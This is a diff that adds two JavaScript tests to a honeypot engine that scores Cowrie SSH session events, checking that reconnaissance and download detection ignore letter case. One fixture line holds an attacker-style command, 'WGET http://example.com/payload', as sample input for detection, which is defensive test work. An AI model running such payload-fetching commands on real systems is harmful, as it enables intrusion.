@@ -121,3 +121,25 @@ test('Malformed timestamps handled safely', (t) => {
     const result = engine.evaluateSessionEvents(events);
     assert.strictEqual(result.threatScore, 2); // Still scored correctly
 });
+
+test('Reconnaissance detection is case-insensitive', () => {
+    const events = [
+        { eventid: 'cowrie.login.success', username: 'root' },
+        { eventid: 'cowrie.command.input', input: 'WHOAMI' }
+    ];
+
+    const result = engine.evaluateSessionEvents(events);
+
+    assert.strictEqual(result.summary.reconCount, 1);
+});
+
+test('Download detection is case-insensitive', () => {
+    const events = [
+        { eventid: 'cowrie.login.success', username: 'root' },
+        { eventid: 'cowrie.command.input', input: 'WGET http://example.com/payload' }
+    ];
+
+    const result = engine.evaluateSessionEvents(events);
+
+    assert.strictEqual(result.summary.downloadCount, 1);
+});
